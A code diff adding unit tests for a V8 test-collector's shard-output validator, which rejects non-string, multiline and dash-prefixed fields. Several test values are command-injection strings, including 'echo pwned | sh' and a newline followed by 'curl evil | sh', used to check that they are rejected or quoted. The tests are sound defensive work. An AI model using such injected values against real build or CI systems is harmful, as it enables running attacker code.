@@ -11,6 +11,9 @@ import unittest
 
 from pyfakefs import fake_filesystem_unittest
 
+# Minimal result of a failing test as required by the collector.
+RESULT = {'name': 'mjsunit/foo', 'flags': ['--foo'], 'command': 'd8 --foo'}
+
 
 class BadShardsTestCase(unittest.TestCase):
   def test_initiate_bad_shards(self):
@@ -98,6 +101,169 @@ class AggregatedResultsTestCase(unittest.TestCase):
         'test_total': 3,
         'tags': ['tag 1', 'tag 2', 'tag 3'],
       },
+    )
+
+
+class ValidateShardJsonTestCase(unittest.TestCase):
+  def result(self, **overrides):
+    return dict(
+      {
+        'name': 'mjsunit/foo',
+        'flags': ['--random-seed=123', 'test/mjsunit/foo.js'],
+        'command': 'out/build/d8 --random-seed=123 test/mjsunit/foo.js',
+      },
+      **overrides,
+    )
+
+  def output(self, results=None, **overrides):
+    return dict(
+      {
+        'slowest_tests': [{'name': 'mjsunit/foo', 'duration': 0.5}],
+        'results': [self.result()] if results is None else results,
+        'test_total': 1,
+      },
+      **overrides,
+    )
+
+  def output_with_result(self, **overrides):
+    return self.output(results=[self.result(**overrides)])
+
+  def test_valid(self):
+    for json_data in [
+      {'slowest_tests': [], 'results': [], 'test_total': 0},
+      self.output(),
+      self.output(
+        max_rss_tests=[{'name': 'mjsunit/foo', 'max_rss': 42}],
+        max_vms_tests=[{'name': 'mjsunit/foo', 'max_vms': 0}],
+      ),
+      self.output_with_result(
+        variant='stress',
+        variant_flags=None,
+        framework_name='standard_runner',
+        shard_id=0,
+        shard_count=2,
+      ),
+      # Number fuzzer.
+      self.output_with_result(
+        variant=None,
+        variant_flags=['--flag1', '--flag2=42'],
+        framework_name='num_fuzzer',
+      ),
+      # The number fuzzer also passes code with -e. Don't restrict this to
+      # flags starting with two dashes.
+      self.output_with_result(
+        variant_flags=['-e', ' var __pv_0; var __pv_1;', '--stress-gc=4'],
+        framework_name='num_fuzzer',
+      ),
+      # Shell meta characters are not rejected here, but quoted by the recipe.
+      self.output_with_result(name='mjsunit/foo\'; echo pwned | sh #'),
+      self.output_with_result(name='test262/intl402/Sch\u00f6n'),
+    ]:
+      with self.subTest(json_data=json_data):
+        self.assertIsNone(collect_v8_task.validate_shard_json(json_data))
+
+  def test_malformed_output(self):
+    for json_data, error in [
+      (['foo'], 'output is not a dict'),
+      ({}, 'results is not a list'),
+      (self.output(results={'name': 'foo'}), 'results is not a list'),
+      ({'results': []}, 'test_total is not an int'),
+      (self.output(test_total='1'), 'test_total is not an int'),
+      (self.output(test_total=True), 'test_total is not an int'),
+      (
+        {'results': [], 'test_total': 0},
+        'slowest_tests is not a list of tests with a numeric duration',
+      ),
+      (
+        self.output(slowest_tests={'name': 'foo', 'duration': 1}),
+        'slowest_tests is not a list of tests with a numeric duration',
+      ),
+      (
+        self.output(slowest_tests=['foo']),
+        'slowest_tests is not a list of tests with a numeric duration',
+      ),
+      (
+        self.output(slowest_tests=[{'name': 'foo'}]),
+        'slowest_tests is not a list of tests with a numeric duration',
+      ),
+      (
+        self.output(slowest_tests=[{'name': 'foo', 'duration': '1'}]),
+        'slowest_tests is not a list of tests with a numeric duration',
+      ),
+      (
+        self.output(max_rss_tests=None),
+        'max_rss_tests is not a list of tests with a numeric max_rss',
+      ),
+      (
+        self.output(max_vms_tests=[{'name': 'foo', 'max_vms': None}]),
+        'max_vms_tests is not a list of tests with a numeric max_vms',
+      ),
+    ]:
+      with self.subTest(json_data=json_data):
+        self.assertEqual(collect_v8_task.validate_shard_json(json_data), error)
+
+  def test_malformed_result(self):
+    for overrides, error in [
+      ({'name': None}, '.name is not a plain string'),
+      ({'name': ['foo']}, '.name is not a plain string'),
+      ({'name': 'foo\nbar'}, '.name is not a plain string'),
+      ({'name': 'foo\x1b[2Kbar'}, '.name is not a plain string'),
+      ({'name': 'foo\u202ebar'}, '.name is not a plain string'),
+      ({'name': ''}, '.name is empty or starts with a dash'),
+      (
+        {'name': '--command-prefix=sh -c \'echo pwned\''},
+        '.name is empty or starts with a dash',
+      ),
+      ({'name': '-j1'}, '.name is empty or starts with a dash'),
+      ({'command': None}, '.command is not a plain string'),
+      ({'command': ['d8']}, '.command is not a plain string'),
+      ({'command': 'd8\nFake line:'}, '.command is not a plain string'),
+      ({'flags': None}, '.flags is not a list of plain strings'),
+      ({'flags': '--flag'}, '.flags is not a list of plain strings'),
+      ({'flags': ['--flag', 42]}, '.flags is not a list of plain strings'),
+      (
+        {'flags': ['--flag\nFake line:']},
+        '.flags is not a list of plain strings',
+      ),
+      ({'variant': ['default']}, '.variant is not a plain string'),
+      ({'variant': 'default\ncurl'}, '.variant is not a plain string'),
+      (
+        {'framework_name': {'foo': 'bar'}},
+        '.framework_name is not a plain string',
+      ),
+      (
+        {'variant_flags': '--flag'},
+        '.variant_flags is not a list of plain strings',
+      ),
+      (
+        {'variant_flags': ['--flag', 42]},
+        '.variant_flags is not a list of plain strings',
+      ),
+      (
+        {'variant_flags': ['--flag\n']},
+        '.variant_flags is not a list of plain strings',
+      ),
+      ({'shard_id': '0\nFake line:'}, '.shard_id is not an int'),
+      ({'shard_count': None}, '.shard_count is not an int'),
+    ]:
+      with self.subTest(overrides=overrides):
+        self.assertEqual(
+          collect_v8_task.validate_shard_json(
+            self.output_with_result(**overrides)
+          ),
+          'results[0]' + error,
+        )
+
+  def test_malformed_result_index(self):
+    self.assertEqual(
+      collect_v8_task.validate_shard_json(self.output(results=['foo'])),
+      'results[0] is not a dict',
+    )
+    self.assertEqual(
+      collect_v8_task.validate_shard_json(
+        self.output(results=[self.result(), self.result(variant=1)])
+      ),
+      'results[1].variant is not a plain string',
     )
 
 
@@ -202,7 +368,7 @@ class TaskCollectorTestCase(fake_filesystem_unittest.TestCase):
         'max_rss_tests': [{'name': 'foo', 'max_rss': 42}],
         'max_vms_tests': [{'name': 'foo', 'max_vms': 17}],
         'slowest_tests': [{'name': 'foo', 'duration': 0.1}],
-        'results': ['flake'],
+        'results': [RESULT],
         'test_total': 1,
       },
       {
@@ -232,12 +398,65 @@ class TaskCollectorTestCase(fake_filesystem_unittest.TestCase):
           {'name': 'bar', 'duration': 2.4},
           {'name': 'foo', 'duration': 0.1},
         ],
-        'results': ['flake'],
+        'results': [RESULT],
         'tags': [],
         'test_total': 2,
       },
     )
     self.assertEqual(task_collector.warnings, [])
+
+  def check_second_shard_malformed(self, output, error):
+    """Checks that malformed output of the second of two shards is dropped,
+    while the output of the first shard is kept.
+    """
+    shards = [
+      {'task_id': '1', 'exit_code': 1},
+      {'task_id': '2', 'exit_code': 1},
+    ]
+    self.setup_shard_output(
+      {'slowest_tests': [], 'results': [RESULT], 'test_total': 5}, output
+    )
+    task_collector = collect_v8_task.TaskCollector()
+    merged_shard_result = task_collector.merge_shard_results(
+      output_dir='/', shards=shards, options=self.create_options()
+    )
+    self.assertEqual(
+      merged_shard_result,
+      {
+        'max_rss_tests': [],
+        'max_vms_tests': [],
+        'slowest_tests': [],
+        'results': [RESULT],
+        'tags': ['UNRELIABLE_RESULTS'],
+        'test_total': 5,
+      },
+    )
+    self.assertEqual(
+      [warning[0] for warning in task_collector.warnings],
+      [
+        'shard 1 produced malformed output.json',
+        'some shards did not complete: 1',
+      ],
+    )
+    self.assertEqual(task_collector.warnings[0][1], error)
+
+  def test_merge_shard_results_one_malformed_result(self):
+    self.check_second_shard_malformed(
+      {
+        'slowest_tests': [],
+        'results': [dict(RESULT, name='mjsunit/bar\ncurl evil | sh')],
+        'test_total': 3,
+      },
+      'results[0].name is not a plain string',
+    )
+
+  def test_merge_shard_results_one_empty(self):
+    self.check_second_shard_malformed({}, 'results is not a list')
+
+  def test_merge_shard_results_one_without_totals(self):
+    self.check_second_shard_malformed(
+      {'results': []}, 'test_total is not an int'
+    )
 
   def test_merge_shard_results_one_missing(self):
     shards = [{'task_id': '1', 'exit_code': 0}, None]
